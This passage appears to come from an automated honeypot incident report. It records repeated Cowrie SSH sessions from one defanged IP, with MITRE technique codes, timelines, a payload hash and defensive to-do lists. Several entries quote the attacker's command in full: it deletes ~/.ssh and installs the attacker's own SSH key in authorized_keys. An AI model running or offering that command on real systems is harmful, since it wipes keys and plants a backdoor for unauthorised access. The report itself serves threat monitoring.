| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:47:03` | `cowrie.session.connect` |
| `2026-06-14 21:47:03` | `cowrie.client.version` |
| `2026-06-14 21:47:03` | `cowrie.client.kex` |
| `2026-06-14 21:47:04` | `cowrie.login.success` |
| `2026-06-14 21:47:05` | `cowrie.session.params` |
| `2026-06-14 21:47:05` | `cowrie.command.input` |
| `2026-06-14 21:47:05` | `cowrie.command.failed` |
| `2026-06-14 21:47:05` | `cowrie.log.closed` |
| `2026-06-14 21:47:05` | `cowrie.session.params` |
| `2026-06-14 21:47:05` | `cowrie.command.input` |
| `2026-06-14 21:47:05` | `cowrie.session.file_download` |
| `2026-06-14 21:47:05` | `cowrie.log.closed` |
| `2026-06-14 21:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5675d06958

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 21:47 |
| **Last Seen** | 2026-06-14 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:47:08` | `cowrie.session.connect` |
| `2026-06-14 21:47:08` | `cowrie.client.version` |
| `2026-06-14 21:47:08` | `cowrie.client.kex` |
| `2026-06-14 21:47:09` | `cowrie.login.success` |
| `2026-06-14 21:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade9d0baee77

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 21:48 |
| **Last Seen** | 2026-06-14 21:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:48:47` | `cowrie.session.connect` |
| `2026-06-14 21:48:47` | `cowrie.client.version` |
| `2026-06-14 21:48:47` | `cowrie.client.kex` |
| `2026-06-14 21:48:48` | `cowrie.login.success` |
| `2026-06-14 21:48:48` | `cowrie.session.params` |
| `2026-06-14 21:48:48` | `cowrie.command.input` |
| `2026-06-14 21:48:48` | `cowrie.command.failed` |
| `2026-06-14 21:48:49` | `cowrie.log.closed` |
| `2026-06-14 21:48:49` | `cowrie.session.params` |
| `2026-06-14 21:48:49` | `cowrie.command.input` |
| `2026-06-14 21:48:49` | `cowrie.session.file_download` |
| `2026-06-14 21:48:49` | `cowrie.log.closed` |
| `2026-06-14 21:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08d84147aed2

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 21:48 |
| **Last Seen** | 2026-06-14 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:48:52` | `cowrie.session.connect` |
| `2026-06-14 21:48:52` | `cowrie.client.version` |
| `2026-06-14 21:48:52` | `cowrie.client.kex` |
| `2026-06-14 21:48:53` | `cowrie.login.success` |
| `2026-06-14 21:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbabad5c8e10

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 21:56 |
| **Last Seen** | 2026-06-14 21:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:56:21` | `cowrie.session.connect` |
| `2026-06-14 21:56:21` | `cowrie.client.version` |
| `2026-06-14 21:56:22` | `cowrie.client.kex` |
| `2026-06-14 21:56:23` | `cowrie.login.success` |
| `2026-06-14 21:56:23` | `cowrie.session.params` |
| `2026-06-14 21:56:23` | `cowrie.command.input` |
| `2026-06-14 21:56:23` | `cowrie.command.failed` |
| `2026-06-14 21:56:23` | `cowrie.log.closed` |
| `2026-06-14 21:56:24` | `cowrie.session.params` |
| `2026-06-14 21:56:24` | `cowrie.command.input` |
| `2026-06-14 21:56:24` | `cowrie.session.file_download` |
| `2026-06-14 21:56:24` | `cowrie.log.closed` |
| `2026-06-14 21:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdf13444d68

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 21:56 |
| **Last Seen** | 2026-06-14 21:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 21:56:27` | `cowrie.session.connect` |
| `2026-06-14 21:56:27` | `cowrie.client.version` |
| `2026-06-14 21:56:27` | `cowrie.client.kex` |
| `2026-06-14 21:56:28` | `cowrie.login.success` |
| `2026-06-14 21:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7472de661ae7

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:02 |
| **Last Seen** | 2026-06-14 22:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:02:19` | `cowrie.session.connect` |
| `2026-06-14 22:02:19` | `cowrie.client.version` |
| `2026-06-14 22:02:20` | `cowrie.client.kex` |
| `2026-06-14 22:02:20` | `cowrie.login.success` |
| `2026-06-14 22:02:21` | `cowrie.session.params` |
| `2026-06-14 22:02:21` | `cowrie.command.input` |
| `2026-06-14 22:02:21` | `cowrie.command.failed` |
| `2026-06-14 22:02:21` | `cowrie.log.closed` |
| `2026-06-14 22:02:22` | `cowrie.session.params` |
| `2026-06-14 22:02:22` | `cowrie.command.input` |
| `2026-06-14 22:02:22` | `cowrie.session.file_download` |
| `2026-06-14 22:02:22` | `cowrie.log.closed` |
| `2026-06-14 22:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21b5ef077a0b

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:02 |
| **Last Seen** | 2026-06-14 22:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:02:24` | `cowrie.session.connect` |
| `2026-06-14 22:02:24` | `cowrie.client.version` |
| `2026-06-14 22:02:25` | `cowrie.client.kex` |
| `2026-06-14 22:02:26` | `cowrie.login.success` |
| `2026-06-14 22:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b814757029

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:08 |
| **Last Seen** | 2026-06-14 22:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:08:16` | `cowrie.session.connect` |
| `2026-06-14 22:08:16` | `cowrie.client.version` |
| `2026-06-14 22:08:16` | `cowrie.client.kex` |
| `2026-06-14 22:08:17` | `cowrie.login.success` |
| `2026-06-14 22:08:17` | `cowrie.session.params` |
| `2026-06-14 22:08:17` | `cowrie.command.input` |
| `2026-06-14 22:08:17` | `cowrie.command.failed` |
| `2026-06-14 22:08:18` | `cowrie.log.closed` |
| `2026-06-14 22:08:18` | `cowrie.session.params` |
| `2026-06-14 22:08:18` | `cowrie.command.input` |
| `2026-06-14 22:08:18` | `cowrie.session.file_download` |
| `2026-06-14 22:08:18` | `cowrie.log.closed` |
| `2026-06-14 22:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85106be0bb14

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:08 |
| **Last Seen** | 2026-06-14 22:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:08:21` | `cowrie.session.connect` |
| `2026-06-14 22:08:21` | `cowrie.client.version` |
| `2026-06-14 22:08:21` | `cowrie.client.kex` |
| `2026-06-14 22:08:22` | `cowrie.login.success` |
| `2026-06-14 22:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b317c7c51a73

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:22 |
| **Last Seen** | 2026-06-14 22:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:22:17` | `cowrie.session.connect` |
| `2026-06-14 22:22:17` | `cowrie.client.version` |
| `2026-06-14 22:22:17` | `cowrie.client.kex` |
| `2026-06-14 22:22:18` | `cowrie.login.success` |
| `2026-06-14 22:22:18` | `cowrie.session.params` |
| `2026-06-14 22:22:18` | `cowrie.command.input` |
| `2026-06-14 22:22:18` | `cowrie.command.failed` |
| `2026-06-14 22:22:19` | `cowrie.log.closed` |
| `2026-06-14 22:22:19` | `cowrie.session.params` |
| `2026-06-14 22:22:19` | `cowrie.command.input` |
| `2026-06-14 22:22:19` | `cowrie.session.file_download` |
| `2026-06-14 22:22:19` | `cowrie.log.closed` |
| `2026-06-14 22:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac6ff2c0885a

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:22 |
| **Last Seen** | 2026-06-14 22:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:22:22` | `cowrie.session.connect` |
| `2026-06-14 22:22:22` | `cowrie.client.version` |
| `2026-06-14 22:22:22` | `cowrie.client.kex` |
| `2026-06-14 22:22:23` | `cowrie.login.success` |
| `2026-06-14 22:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dfb71344de6

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:26 |
| **Last Seen** | 2026-06-14 22:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:26:27` | `cowrie.session.connect` |
| `2026-06-14 22:26:27` | `cowrie.client.version` |
| `2026-06-14 22:26:27` | `cowrie.client.kex` |
| `2026-06-14 22:26:28` | `cowrie.login.success` |
| `2026-06-14 22:26:28` | `cowrie.session.params` |
| `2026-06-14 22:26:28` | `cowrie.command.input` |
| `2026-06-14 22:26:28` | `cowrie.command.failed` |
| `2026-06-14 22:26:29` | `cowrie.log.closed` |
| `2026-06-14 22:26:29` | `cowrie.session.params` |
| `2026-06-14 22:26:29` | `cowrie.command.input` |
| `2026-06-14 22:26:29` | `cowrie.session.file_download` |
| `2026-06-14 22:26:29` | `cowrie.log.closed` |
| `2026-06-14 22:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa34abe63e2e

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:26 |
| **Last Seen** | 2026-06-14 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:26:32` | `cowrie.session.connect` |
| `2026-06-14 22:26:32` | `cowrie.client.version` |
| `2026-06-14 22:26:32` | `cowrie.client.kex` |
| `2026-06-14 22:26:33` | `cowrie.login.success` |
| `2026-06-14 22:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-982e3b4918ab

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:28 |
| **Last Seen** | 2026-06-14 22:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:28:33` | `cowrie.session.connect` |
| `2026-06-14 22:28:33` | `cowrie.client.version` |
| `2026-06-14 22:28:33` | `cowrie.client.kex` |
| `2026-06-14 22:28:34` | `cowrie.login.success` |
| `2026-06-14 22:28:34` | `cowrie.session.params` |
| `2026-06-14 22:28:34` | `cowrie.command.input` |
| `2026-06-14 22:28:34` | `cowrie.command.failed` |
| `2026-06-14 22:28:35` | `cowrie.log.closed` |
| `2026-06-14 22:28:35` | `cowrie.session.params` |
| `2026-06-14 22:28:35` | `cowrie.command.input` |
| `2026-06-14 22:28:35` | `cowrie.session.file_download` |
| `2026-06-14 22:28:35` | `cowrie.log.closed` |
| `2026-06-14 22:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936adb066c11

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:28 |
| **Last Seen** | 2026-06-14 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:28:38` | `cowrie.session.connect` |
| `2026-06-14 22:28:38` | `cowrie.client.version` |
| `2026-06-14 22:28:38` | `cowrie.client.kex` |
| `2026-06-14 22:28:39` | `cowrie.login.success` |
| `2026-06-14 22:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3745d13718a

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:30 |
| **Last Seen** | 2026-06-14 22:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:30:29` | `cowrie.session.connect` |
| `2026-06-14 22:30:29` | `cowrie.client.version` |
| `2026-06-14 22:30:29` | `cowrie.client.kex` |
| `2026-06-14 22:30:30` | `cowrie.login.success` |
| `2026-06-14 22:30:30` | `cowrie.session.params` |
| `2026-06-14 22:30:30` | `cowrie.command.input` |
